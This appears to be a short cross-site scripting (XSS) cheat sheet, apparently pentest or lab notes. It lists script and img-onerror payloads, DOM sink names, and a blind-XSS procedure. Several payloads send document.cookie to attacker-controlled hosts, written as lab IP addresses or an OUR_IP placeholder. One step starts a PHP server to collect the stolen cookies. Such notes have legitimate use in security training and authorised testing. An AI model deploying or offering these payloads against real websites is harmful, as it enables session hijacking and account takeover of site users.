
## Basic
```
<script>alert("Hi")</script>
```

```
<script>print()</script>
```

```
<script>alert(document.cookie)</script>
```

```
<script>alert(window.origin)</script>
```

### Writing DOM Objects
```
document.write()
```

```
DOM.innerHTML
```

```
DOM.outerHTML
```

```
add()
```

```
after()
```

```
append()
```

```
<img src="" onerror=alert(window.origin)>
```

```
<script src="http://OUR_IP/script.js"></script>
```


```bash
<img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
```
## Blind XSS
1) Find Vulnerable Parameter
2) Create script.js to POST cookie

```
new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
```

3) Start PHP server. 

```shell
php -S 0.0.0.0:80
```

4) Use script src in vulnerable parameter

```
"><script src=http://10.10.16.33/script.js></script>
```

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
```